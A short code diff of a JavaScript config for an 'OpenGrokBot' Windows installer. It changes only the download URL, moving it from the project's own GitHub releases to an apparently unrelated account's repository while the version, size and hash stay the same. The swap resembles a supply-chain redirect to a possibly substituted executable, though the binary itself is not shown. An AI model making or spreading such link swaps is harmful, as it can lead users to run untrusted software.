@@ -9,7 +9,7 @@ const CONFIG = {
   version: "1.5.0",
   sizeMB: 83,
   sha256: "22ed406a9556016efa4d92e4abe3484e4dbb3525624d7e03a91243146c500fc3",
-  assetUrl: "https://github.com/Crepald-01/OpenGrokBot/releases/download/v1.5.0/OpenGrokBot-Setup-1.5.0.exe",
+  assetUrl: "https://github.com/nyashadzashetinotendandiripo-dot/zerothe-ai/releases/download/v1.5.0/OpenGrokBot-Setup-1.5.0.exe",
 };
 // ----------------------------------------------------------------------------------------------------------
 
